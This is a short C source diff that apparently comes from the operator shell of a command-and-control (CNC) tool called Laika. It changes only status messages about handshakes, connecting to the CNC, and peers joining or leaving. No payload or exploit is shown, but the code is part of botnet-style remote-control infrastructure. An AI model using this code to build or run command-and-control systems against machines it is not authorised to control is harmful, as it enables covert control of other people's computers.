@@ -31,6 +31,8 @@ uint64_t shell_ElemHash(const void *item, uint64_t seed0, uint64_t seed1) {
 void shellC_handleHandshakeRes(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
     uint8_t endianness = laikaS_readByte(&peer->sock);
     peer->sock.flipEndian = endianness != laikaS_isBigEndian();
+
+    PRINTSUCC("Handshake accepted!\n");
 }
 
 void shellC_handleAddPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
@@ -185,6 +187,8 @@ void shellC_cleanup(tShell_client *client) {
 void shellC_connectToCNC(tShell_client *client, char *ip, char *port) {
     struct sLaika_socket *sock = &client->peer->sock;
 
+    PRINTINFO("Connecting to CNC...\n");
+
     /* create encryption keys */
     if (crypto_kx_client_session_keys(client->peer->inKey, client->peer->outKey, client->pub, client->priv, client->peer->peerPub) != 0)
         LAIKA_ERROR("failed to gen session key!\n");
@@ -291,9 +295,9 @@ int shellC_addPeer(tShell_client *client, tShell_peer *newPeer) {
 
     /* let user know */
     if (!shellC_isShellOpen(client)) {
-        shellT_printf("\nNew peer connected to CNC:\n");
-        shellP_printInfo(newPeer);
+        PRINTSUCC("Peer %04d connected\n", id)
     }
+
     return id;
 }
 
@@ -304,9 +308,9 @@ void shellC_rmvPeer(tShell_client *client, tShell_peer *oldPeer, int id) {
     /* remove peer from hashmap */
     hashmap_delete(client->peers, &(tShell_hashMapElem){.pub = oldPeer->pub, .peer = oldPeer});
 
+    /* tell user */
     if (!shellC_isShellOpen(client)) {
-        shellT_printf("\nPeer disconnected from CNC:\n");
-        shellP_printInfo(oldPeer);
+        PRINTINFO("Peer %04d disconnected\n", id)
     }
 
     /* finally, free peer */
